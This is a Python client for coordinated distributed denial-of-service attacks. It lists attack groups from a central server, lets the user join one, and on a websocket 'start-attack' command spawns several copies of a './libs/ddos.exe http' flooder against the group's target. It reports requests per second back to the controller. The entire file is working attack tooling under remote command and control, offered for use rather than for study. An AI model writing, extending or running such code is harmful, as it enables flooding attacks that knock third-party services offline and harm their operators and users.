import psutil
import websocket
import json
import os
import requests
import threading
import subprocess
import time
from psutil import Process


from rich.console import Console
from rich.table import Table
from configs.ip import IP

console = Console()
group_name = ['']
groups = {}

cores = os.cpu_count()
if not cores:
    console.log('[red]Failed to retrive CPU count, default: 2')
    cores = 2

suggested_threads = cores * 10
suggested_processes = cores // 4 + 1
suggested_power = suggested_processes * suggested_threads

def print_group(group_name):
    global groups

    old_groups = {}
    while not group_name[0]:
        groups = requests.get(f'http://{IP}/group/json').json()
        if groups == old_groups:
            time.sleep(5)
            continue

        old_groups = groups
        console.clear()

        table = Table()
        table.add_column('Name', style='cyan')
        table.add_column('Target', style='orange3')
        table.add_column('Members', style='magenta')
        table.add_column('Power/Threads', style='red')
        table.add_column('Status', style='cyan')
        table.add_column('Minimum Power', style='green')

        for group in groups:
            info = groups[group]
            name, target, members, power, status, min_power = group, info['target'], str(info['members_count']), str(info['threads']), info['status'], str(info['min_power'])
            table.add_row(name, target, members, power, status, min_power)
        console.print(table)
        console.print('[cyan][?][/cyan] Group Name >', end='')

        time.sleep(5)

threading.Thread(target=print_group, args=(group_name,)).start()
while True:
    group_name[0] = input('')
    if group_name[0] in groups:
        break
    console.print('[cyan][?][/cyan] Group Name >', end='')

min_power = groups[group_name[0]]['min_power']
while True:
    try:
        threads = int(console.input(f'[cyan][?][/cyan] How many threads? (suggested: {suggested_threads})'))
        processes = int(console.input(f'[cyan][?][/cyan] How many processes? (suggested: {suggested_processes})'))
    except ValueError: continue

    if threads * processes < min_power:
        print(f'Your PC doesn\'t reach the minimum power required: {threads * processes}/{min_power}')
        continue

    if threads > 0 and processes > 0:
        break

target = groups[group_name[0]]['target']


class Attack:
    def __init__(self):
        self.status = 0
        self.pids = []

    def start_attack(self):
        if self.status: return
        console.log('[green][+] The attack has been started[/green]')
        self.status = 1

        for _ in range(processes):
            process = subprocess.Popen([f'./libs/ddos.exe', 'http', '-threads', str(threads), target], stdout=subprocess.PIPE)
            self.pids.append(process.pid)
        
        t = threading.Thread(target=self.stalk_stats)
        t.daemon = True
        t.start()

    def stop_attack(self):
        if not self.status: return
        console.log('[red][!] The attack has been stopped[/red]')
        self.status = 0
        for pid in self.pids:
            Process(pid).kill()
        
        for pid in self.pids:
            os.remove(f'pids/{pid}.txt')

        self.pids = []

    def stalk_stats(self):
        current_proc = psutil.Process(os.getpid())

        old_total_reqs = 0
        last_time = time.time()
        while self.status:
            total_reqs = 0
            ptable = Table(title='Process Stats')
            ptable.add_column('PID', style='cyan')
            ptable.add_column('Reqs', style='magenta')
            ptable.add_column('Threads', style='magenta')
            ptable.add_column('CPU Usage', style='orange3')

            for pid in self.pids:
                try:
                    with open(f'pids/{pid}.txt', 'r') as f:
                        reqs = int(f.read())
                except:
                    console.log(f'[orange3][-] Failed to read pids/{pid}.txt')
                    continue
                ptable.add_row(str(pid), str(reqs), str(threads), str(psutil.Process(pid).cpu_percent()))
                total_reqs += reqs

            req_time_count = (total_reqs - old_total_reqs)
            time_passed = time.time() - last_time
            
            # req_time_count : time_passed = x : 1
            # req_time_count * 1 / time_passed
            # req_time_count / time_passed

            if time_passed != 0:
                req_per_second = round(req_time_count / time_passed, 2)
            else:
                req_per_second = 0

            console.clear()
            console.print(ptable)

            console.print(f'[red][*][/red] Attack Running with {processes * threads} Threads against [orange3]{target}[/orange3]')
            console.print(f'[red][*][/red] Total Requests: {total_reqs} Req/S: {round(req_per_second, 2)}')

            ws.send(json.dumps({'p': 'analytics', 'per_second': req_per_second, 'plus': req_time_count}))
            old_total_reqs = total_reqs
            last_time = time.time()
            time.sleep(1)

attack = Attack()

def on_message(ws, message):
    data = json.loads(message)

    if data['p'] == 'joined':
        console.log('[green]Succesfully joined')
        if groups[group_name[0]]['status'] != 'RUNNING':
            console.log('[cyan]waiting for the attack to start...')
    elif data['p'] == 'identify':
        console.log(f'Group joined as [magenta]{data["usr"]}[/magenta]')
    elif data['p'] == 'start-attack':
        attack.start_attack()
    elif data['p'] == 'stop-attack':
        attack.stop_attack()
    elif data['p'] == 'kick':
        console.log('[red][!] You\'ve been kicked from this attack group')
        ws.close()
    elif data['p'] == 'err':
        console.log('ERROR: ', data['msg'])

def on_error(ws, error):
    console.log(f'[red]WebSocket Error: {error}')
    attack.stop_attack()

def on_close(ws, close_status_code, close_msg):
    console.log(f"[red][-] Connection Closed {close_status_code=} {close_msg=}")
    attack.stop_attack()

def on_open(ws):
    ws.send(json.dumps({'p': 'identify', 'username': 'traba'}))
    ws.send(json.dumps({'p': 'join-group', 'name': group_name[0], 'cores': cores, 'threads': threads * processes}))
    if groups[group_name[0]]['status'] == 'RUNNING':
        attack.start_attack()

if __name__ == "__main__":
    websocket.enableTrace(False)
    ws = websocket.WebSocketApp(f"ws://{IP}/websocket",
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)

    ws.run_forever(reconnect=5)
